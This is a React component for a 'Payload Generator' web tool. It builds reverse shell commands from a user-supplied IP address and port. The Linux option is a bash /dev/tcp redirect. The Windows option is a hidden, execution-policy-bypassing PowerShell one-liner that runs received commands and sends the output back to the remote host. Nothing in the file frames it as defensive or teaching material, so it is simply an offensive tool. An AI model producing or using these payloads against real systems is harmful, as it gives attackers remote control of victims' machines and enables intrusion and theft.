'use client';

import { useState } from 'react';

export default function PayloadGenerator() {
  const [os, setOs] = useState('linux');
  const [ip, setIp] = useState('');
  const [port, setPort] = useState('');
  const [payload, setPayload] = useState('');

  const generatePayload = () => {
    if (!ip || !port) {
      setPayload('Please provide both IP and port.');
      return;
    }

    const payloads = {
      linux: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      windows: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`,
    };

    setPayload(payloads[os]);
  };

  return (
    <div className="bg-[#0f172a] text-[#a3f7bf] p-6 rounded-lg shadow-lg max-w-xl w-full mx-auto">
      <h2 className="text-2xl font-bold mb-4 text-[#22c55e]">Payload Generator</h2>

      <div className="mb-4">
        <label className="block mb-1 text-[#bbf7d0]">Operating System</label>
        <select
          className="bg-[#1e293b] p-2 rounded w-full"
          value={os}
          onChange={(e) => setOs(e.target.value)}
        >
          <option value="linux">Linux</option>
          <option value="windows">Windows</option>
        </select>
      </div>

      <div className="mb-4">
        <label className="block mb-1 text-[#bbf7d0]">IP Address</label>
        <input
          className="bg-[#1e293b] p-2 rounded w-full"
          value={ip}
          onChange={(e) => setIp(e.target.value)}
          placeholder="e.g. 192.168.1.10"
        />
      </div>

      <div className="mb-4">
        <label className="block mb-1 text-[#bbf7d0]">Port</label>
        <input
          className="bg-[#1e293b] p-2 rounded w-full"
          value={port}
          onChange={(e) => setPort(e.target.value)}
          placeholder="e.g. 4444"
        />
      </div>

      <button
        onClick={generatePayload}
        className="bg-[#22c55e] text-[#0f172a] px-4 py-2 rounded hover:bg-[#16a34a] transition-colors"
      >
        Generate
      </button>

      {payload && (
        <div className="mt-4 bg-[#1e293b] p-4 rounded text-sm break-all">
          <strong>Generated Payload:</strong>
          <pre className="whitespace-pre-wrap mt-2">{payload}</pre>
        </div>
      )}
    </div>
  );
}
